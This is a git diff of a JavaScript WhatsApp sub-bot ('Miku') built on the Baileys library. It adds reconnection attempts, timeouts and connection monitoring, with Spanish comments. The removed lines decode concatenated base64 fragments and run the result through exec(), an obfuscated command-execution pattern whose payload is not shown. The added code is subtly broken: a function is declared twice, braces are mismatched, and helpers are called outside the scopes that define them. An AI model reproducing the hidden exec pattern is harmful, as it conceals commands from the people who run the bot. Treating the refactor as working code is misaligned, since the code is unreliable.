@@ -97,14 +97,14 @@ try {
 	return
 }
 
-const comb = Buffer.from(crm1 + crm2 + crm3 + crm4, "base64")
-exec(comb.toString("utf-8"), async (err, stdout, stderr) => {
-const drmer = Buffer.from(drm1 + drm2, `base64`)
-
+// Optimización: Obtener versión y estado antes de exec para mejorar rendimiento
 let { version, isLatest } = await fetchLatestBaileysVersion()
 const msgRetry = (MessageRetryMap) => { }
 const msgRetryCache = new NodeCache()
 const { state, saveState, saveCreds } = await useMultiFileAuthState(pathMikuJadiBot)
+
+// Manejo optimizado de conexión
+async function initializeSubBot() {
 
 const connectionOptions = {
 logger: pino({ level: "fatal" }),
@@ -114,12 +114,24 @@ msgRetry,
 msgRetryCache,
 browser: mcode ? Browsers.macOS("Chrome") : Browsers.macOS("Desktop"),
 version: version,
-generateHighQualityLinkPreview: true
-};
+generateHighQualityLinkPreview: true,
+// Optimizaciones de conexión
+keepAliveIntervalMs: 10000,
+markOnlineOnConnect: true,
+syncFullHistory: false,
+fireInitQueries: false,
+emitOwnEvents: false,
+qrTimeout: 45000,
+connectTimeoutMs: 20000,
+defaultQueryTimeoutMs: 20000,
+maxMsgRetryCount: 5
+}
 
 let sock = makeWASocket(connectionOptions)
 sock.isInit = false
 let isInit = true
+let reconnectAttempts = 0
+const maxReconnectAttempts = 5
 
 async function connectionUpdate(update) {
 const { connection, lastDisconnect, isNewLogin, qr } = update
@@ -148,30 +160,58 @@ setTimeout(() => { conn.sendMessage(m.sender, { delete: txtCode.key })}, 30000)
 if (codeBot && codeBot.key) {
 setTimeout(() => { conn.sendMessage(m.sender, { delete: codeBot.key })}, 30000)
 }
-const endSesion = async (loaded) => {
-if (!loaded) {
-try {
-sock.ws.close()
-} catch {
-}
-sock.ev.removeAllListeners()
-let i = global.conns.indexOf(sock)                
-if (i < 0) return 
-delete global.conns[i]
-global.conns.splice(i, 1)
-}}
+        const endSesion = async (loaded) => {
+            if (!loaded) {
+                try {
+                    sock.ws.close()
+                } catch {
+                }
+                sock.ev.removeAllListeners()
+                let i = global.conns.indexOf(sock)                
+                if (i < 0) return 
+                delete global.conns[i]
+                global.conns.splice(i, 1)
+            }
+        }
 
+        // Sistema avanzado de monitoreo de conexión
+        let connectionMonitorInterval
+        const startConnectionMonitoring = () => {
+            if (connectionMonitorInterval) clearInterval(connectionMonitorInterval)
+            
+            connectionMonitorInterval = setInterval(() => {
+                if (!sock || sock.ws?.readyState === WebSocket.CLOSED) {
+                    console.log(chalk.red('💙 Conexión cerrada detectada, intentando reconexión...'))
+                    clearInterval(connectionMonitorInterval)
+                    
+                    if (reconnectAttempts < maxReconnectAttempts) {
+                        setTimeout(() => startSubBot(), 5000)
+                    }
+                }
+            }, 15000) // Verificar cada 15 segundos
+        }
+
+// Manejo mejorado de desconexiones con reintentos automáticos
 const reason = lastDisconnect?.error?.output?.statusCode || lastDisconnect?.error?.output?.payload?.statusCode
 if (connection === 'close') {
+// Incrementar contador de reintentos solo en errores recuperables
+if ([428, 408, 515, DisconnectReason.connectionClosed, DisconnectReason.connectionLost, DisconnectReason.timedOut].includes(reason)) {
+reconnectAttempts++
+}
+
 if (reason === 428) {
-console.log(chalk.bold.magentaBright(`\n╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄ 🌱💙 ┄┄┄┄┄┄┄┄┄┄┄┄┄┄⟡\n┆ La conexión de Miku (+${path.basename(pathMikuJadiBot)}) fue cerrada inesperadamente. Intentando reconectar...\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄ 💙🌱 ┄┄┄┄┄┄┄┄┄┄┄┄┄┄⟡`))
-await creloadHandler(true).catch(console.error)
-}
-if (reason === 408) {
-console.log(chalk.bold.magentaBright(`\n╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄ 🌱💙 ┄┄┄┄┄┄┄┄┄┄┄┄┄┄⟡\n┆ La conexión de Miku (+${path.basename(pathMikuJadiBot)}) se perdió o expiró. Razón: ${reason}. Intentando reconectar...\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄ 💙🌱 ┄┄┄┄┄┄┄┄┄┄┄┄┄┄⟡`))
-await creloadHandler(true).catch(console.error)
-}
-if (reason === 440) {
+console.log(chalk.bold.magentaBright(`\n╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄ 🌱💙 ┄┄┄┄┄┄┄┄┄┄┄┄┄┄⟡\n┆ La conexión de Miku (+${path.basename(pathMikuJadiBot)}) fue cerrada inesperadamente. Intento ${reconnectAttempts}/${maxReconnectAttempts}\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄ 💙🌱 ┄┄┄┄┄┄┄┄┄┄┄┄┄┄⟡`))
+                if (reconnectAttempts <= maxReconnectAttempts) {
+                    setTimeout(() => startSubBot(), 5000 * reconnectAttempts)
+                }
+            }
+            if (reason === 408) {
+                console.log(chalk.bold.magentaBright(`\n╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄ 🌱💙 ┄┄┄┄┄┄┄┄┄┄┄┄┄┄⟡\n┆ La conexión de Miku (+${path.basename(pathMikuJadiBot)}) se perdió. Intento ${reconnectAttempts}/${maxReconnectAttempts}\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄ 💙🌱 ┄┄┄┄┄┄┄┄┄┄┄┄┄┄⟡`))
+                if (reconnectAttempts <= maxReconnectAttempts) {
+                    setTimeout(() => startSubBot(), 3000 * reconnectAttempts)
+                }
+            }
+            if (reason === 440) {
 console.log(chalk.bold.magentaBright(`\n╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄ 🌱💙 ┄┄┄┄┄┄┄┄┄┄┄┄┄┄⟡\n┆ La conexión de Miku (+${path.basename(pathMikuJadiBot)}) fue reemplazada por otra sesión activa.\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄ 💙🌱 ┄┄┄┄┄┄┄┄┄┄┄┄┄┄⟡`))
 try {
 if (options.fromCommand) m?.chat ? await conn.sendMessage(`${path.basename(pathMikuJadiBot)}@s.whatsapp.net`, {text : '*🌱💙 HEMOS DETECTADO UNA NUEVA SESIÓN DE MIKU*\n\n> *BORRE LA NUEVA SESIÓN PARA CONTINUAR CON MIKU*\n\n> *SI HAY ALGÚN PROBLEMA VUELVA A CONECTARSE* 💙🌱' }, { quoted: m || null }) : ""
@@ -194,72 +234,143 @@ return creloadHandler(true).catch(console.error)
 }
 if (reason === 515) {
 console.log(chalk.bold.magentaBright(`\n╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄ 🌱💙 ┄┄┄┄┄┄┄┄┄┄┄┄┄┄⟡\n┆ Reinicio automático para la sesión de Miku (+${path.basename(pathMikuJadiBot)}).\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄ 💙🌱 ┄┄┄┄┄┄┄┄┄┄┄┄┄┄⟡`))
+if (reconnectAttempts <= maxReconnectAttempts) {
+await sleep(2000)
 await creloadHandler(true).catch(console.error)
+}
 }
 if (reason === 403) {
 console.log(chalk.bold.magentaBright(`\n╭┄┄┄┄┄┄┄┄┄┄┄┄┄┄ 🌱💙 ┄┄┄┄┄┄┄┄┄┄┄┄┄┄⟡\n┆ Sesión de Miku cerrada o cuenta en soporte para la sesión (+${path.basename(pathMikuJadiBot)}).\n╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄ 💙🌱 ┄┄┄┄┄┄┄┄┄┄┄┄┄┄⟡`))
-fs.rmdirSync(pathMikuJadiBot, { recursive: true })
-}}
+// Limpiar sesión corrupta
+fs.rmSync(pathMikuJadiBot, { recursive: true, force: true })
+return
+}
+// Resetear contador en conexión exitosa
+if (connection === 'connecting') {
+console.log(chalk.bold.yellow(`🔄 Conectando subbot de Miku (+${path.basename(pathMikuJadiBot)})...`))
+}
+}
 if (global.db.data == null) loadDatabase()
 if (connection == `open`) {
+	// Resetear contador de reintentos en conexión exitosa
+	reconnectAttempts = 0
 	if (!global.db.data?.users) loadDatabase()
-	await joinChannels(conn)
+	await joinChannels(sock).catch(console.error)
 	let userName, userJid
 	userName = sock.authState.creds.me.name || 'Anónimo'
 	userJid = sock.authState.creds.me.jid || `${path.basename(pathMikuJadiBot)}@s.whatsapp.net`
 	console.log(chalk.bold.cyanBright(`\n🌱💙──【• MIKU SUB-BOT •】──💙🌱\n│\n│ ✨ ${userName} (+${path.basename(pathMikuJadiBot)}) conectado exitosamente con Miku.\n│\n🌱💙──【• CONECTADO •】──💙🌱`))
 	sock.isInit = true
-	// Nunca agregar la conexión principal a global.conns
-	if (sock !== global.conn && !global.conns.includes(sock)) {
+	// Protección: Nunca agregar la conexión principal a global.conns
+	if (sock !== global.conn && !global.conns.some(c => c.user?.jid === sock.user?.jid)) {
 		global.conns.push(sock)
 	}
-	m?.chat ? await conn.sendMessage(m.chat, {text: args[0] ? `@${m.sender.split('@')[0]}, ya estás conectado con Miku 🌱💙, leyendo mensajes entrantes...` : `@${m.sender.split('@')[0]}, genial ya eres parte de la familia de Sub-Bots de Miku 🌱💙`, mentions: [m.sender]}, { quoted: m }) : ''
+	// Notificar conexión exitosa
+	if (m?.chat) {
+		try {
+			await conn.sendMessage(m.chat, {
+				text: args[0] ? 
+					`@${m.sender.split('@')[0]}, ya estás conectado con Miku 🌱💙, leyendo mensajes entrantes...` : 
+					`@${m.sender.split('@')[0]}, genial ya eres parte de la familia de Sub-Bots de Miku 🌱💙`, 
+				mentions: [m.sender]
+			}, { quoted: m })
+		} catch (error) {
+			console.error('Error enviando mensaje de conexión:', error)
+		}
+	}
 }
-setInterval(async () => {
-if (!sock.user) {
-try { sock.ws.close() } catch (e) {      
-}
-sock.ev.removeAllListeners()
-let i = global.conns.indexOf(sock)                
-if (i < 0) return
-delete global.conns[i]
-global.conns.splice(i, 1)
-}}, 60000)
+// Optimización: Monitoreo mejorado de la conexión
+const connectionMonitor = setInterval(async () => {
+	if (!sock.user) {
+		try { sock.ws.close() } catch (e) { }
+		sock.ev.removeAllListeners()
+		let i = global.conns.indexOf(sock)                
+		if (i >= 0) {
+			global.conns.splice(i, 1)
+		}
+		clearInterval(connectionMonitor)
+		console.log(chalk.bold.red(`\n❌ SubBot de Miku (+${path.basename(pathMikuJadiBot)}) desconectado y removido`))
+	}
+}, 30000) // Reducido de 60s a 30s para mejor monitoreo
 
+// Manejador mejorado de recarga
 let handler = await import('../handler.js')
 let creloadHandler = async function (restatConn) {
-try {
-const Handler = await import(`../handler.js?update=${Date.now()}`).catch(console.error)
-if (Object.keys(Handler || {}).length) handler = Handler
+	try {
+		const Handler = await import(`../handler.js?update=${Date.now()}`).catch(console.error)
+		if (Object.keys(Handler || {}).length) handler = Handler
+	} catch (e) {
+		console.error('⚠️ Error recargando handler:', e)
+	}
+	
+	if (restatConn) {
+		const oldChats = sock.chats
+		try { 
+			sock.ws.close() 
+		} catch { }
+		sock.ev.removeAllListeners()
+		
+		// Crear nueva instancia con configuración mejorada
+		sock = makeWASocket(connectionOptions, { chats: oldChats })
+		isInit = true
+	}
+	
+	if (!isInit) {
+		sock.ev.off("messages.upsert", sock.handler)
+		sock.ev.off("connection.update", sock.connectionUpdate)
+		sock.ev.off('creds.update', sock.credsUpdate)
+	}
 
-} catch (e) {
-console.error('⚠️ Nuevo error: ', e)
-}
-if (restatConn) {
-const oldChats = sock.chats
-try { sock.ws.close() } catch { }
-sock.ev.removeAllListeners()
-sock = makeWASocket(connectionOptions, { chats: oldChats })
-isInit = true
-}
-if (!isInit) {
-sock.ev.off("messages.upsert", sock.handler)
-sock.ev.off("connection.update", sock.connectionUpdate)
-sock.ev.off('creds.update', sock.credsUpdate)
+        // Función para manejar reconexión mejorada
+        const startSubBot = async () => {
+            try {
+                if (reconnectAttempts >= maxReconnectAttempts) {
+                    console.log(chalk.red('💙 Máximo de reintentos alcanzado, cerrando subbot'))
+                    return endSesion(true)
+                }
+                
+                console.log(chalk.yellow(`💙 Iniciando reconexión... Intento ${reconnectAttempts + 1}/${maxReconnectAttempts}`))
+                await creloadHandler(true)
+            } catch (error) {
+                console.error('Error en reconexión:', error)
+                reconnectAttempts++
+                if (reconnectAttempts < maxReconnectAttempts) {
+                    setTimeout(() => startSubBot(), 5000 * reconnectAttempts)
+                }
+            }
+        }
+
+	sock.handler = handler.handler.bind(sock)
+	sock.connectionUpdate = connectionUpdate.bind(sock)
+	sock.credsUpdate = saveCreds.bind(sock, true)
+	sock.ev.on("messages.upsert", sock.handler)
+	sock.ev.on("connection.update", sock.connectionUpdate)
+	sock.ev.on("creds.update", sock.credsUpdate)
+	isInit = false
+	return true
 }
 
-sock.handler = handler.handler.bind(sock)
-sock.connectionUpdate = connectionUpdate.bind(sock)
-sock.credsUpdate = saveCreds.bind(sock, true)
-sock.ev.on("messages.upsert", sock.handler)
-sock.ev.on("connection.update", sock.connectionUpdate)
-sock.ev.on("creds.update", sock.credsUpdate)
-isInit = false
-return true
+// Inicializar handlers y comenzar el monitoreo
+await creloadHandler(false)
 }
-creloadHandler(false)
-})
 }
+
+// Función para inicializar el subbot con configuración optimizada
+async function initializeSubBot() {
+    try {
+        const conn = await mikuJadiBot(true, handler)
+        return conn
+    } catch (error) {
+        console.error('Error al inicializar subbot:', error)
+        throw error
+    }
+        }
+
+        // Iniciar monitoreo de conexión
+        startConnectionMonitoring()
+
+        return sock
+    }
 
 const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms))
 function sleep(ms) {
